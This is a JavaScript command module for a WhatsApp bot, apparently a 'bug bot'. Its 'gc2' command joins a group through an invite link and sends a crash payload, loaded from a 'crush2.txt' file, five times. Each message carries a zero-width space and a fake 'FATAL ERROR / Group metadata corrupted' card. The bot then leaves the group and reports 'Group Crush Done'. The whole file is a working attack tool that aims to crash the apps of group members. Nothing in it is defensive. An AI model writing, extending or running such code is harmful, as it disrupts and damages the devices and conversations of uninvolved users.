const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gc2",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        if (!args[0]) return;
        try {
            const payload = fs.readFileSync('./lib/payloads/crush2.txt', 'utf-8');
            const code = args[0].split('https://chat.whatsapp.com/')[1];
            const jid = await conn.groupAcceptInvite(code);

            for (let i = 0; i < 5; i++) {
                await conn.sendMessage(jid, { 
                    text: "\u200B" + payload,
                    contextInfo: { externalAdReply: { title: "🥀 FATAL ERROR 🥀", body: "Group metadata corrupted", mediaType: 1, thumbnailUrl: config.menuImage } }
                });
            }
            await conn.groupLeave(jid);
            await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: GC2 Group Crush Done." });
        } catch (e) { console.log(e); }
    }
};
